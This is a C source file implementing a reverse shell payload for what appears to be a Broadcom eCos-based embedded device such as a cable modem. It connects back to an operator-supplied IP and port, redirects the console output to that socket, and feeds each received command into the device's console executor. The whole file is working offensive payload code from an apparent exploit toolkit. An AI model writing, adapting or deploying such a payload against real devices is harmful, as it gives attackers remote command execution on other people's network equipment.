#include "external.h"
#include "payload.h"
/**
 * This is the most basic reverse shell example I could come up with.
 * This is blocking when called from the CLI.   
 */
#define PAYLOAD_PRIORITY     23
#define PAYLOAD_STACKSIZE  0x2000
#define COMMAND_OFFSET  0x1080

int __start(unsigned long ip_address, unsigned short port)
{
    // create remote host sockaddr structure with received IP
    // and port as command line parameters
    struct sockaddr_in* host = (struct sockaddr_in*)\
        malloc(sizeof(struct sockaddr_in)); 
    host->sin_family = AF_INET;
    host->sin_port = port; 
    host->sin_addr.s_addr = ip_address;

    int sockfd;
    int recvd;

    char addrbuf[16];
    inet_ntop4(&host->sin_addr, addrbuf, sizeof(addrbuf));
    printf("[+] Launching reverse shell to %s:%d\n", addrbuf, host->sin_port);
    
    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        printf("[!] socket error - %s\n", strerror(errno));
    }

    // without sleep, the sockfd does not work for some reason
    sleep(2);

    if (connect(sockfd, host, 0x2020) < 0) {
        printf("[!] connect error - %s\n", strerror(errno));
        return -1;
    }
   
    char *buffer = malloc(0x100);
    if(buffer == NULL){
        printf("[!] Error when allocating buffer.\n");
        return -1;
    }

    void *console_instance = BcmConsoleGetSingletonInstance();
    int *fp = (int*)cyg_fp_get(sockfd);
    cyg_fd_assign(0x1, fp);
    cyg_fp_free(fp);

    while (1)	
    {
        bzero(buffer, 0x100);
        recvd = recv(sockfd, buffer, 0x100, 0x0);
        
        if (recvd > 0) {
            char *command_buffer = ((char *)console_instance);
            command_buffer += COMMAND_OFFSET;
            strcpy(command_buffer, buffer);
            if(strncmp("exit", buffer, 4) == 0) {
               break;
            }
            command_buffer[recvd+1] = 0x0;
            BcmConsoleExecuteCurrentCommand(console_instance);
        }
        else{
            // -1 is error; 0 is disconnected
            break;
        }
    }
    printf("[+] Quitting. Reassigning console.\n");
    fp = (int*)cyg_fp_get(2);
    cyg_fd_assign(0x01, fp);
    cyg_fp_free(fp);
    close(sockfd);
    return 0;
}
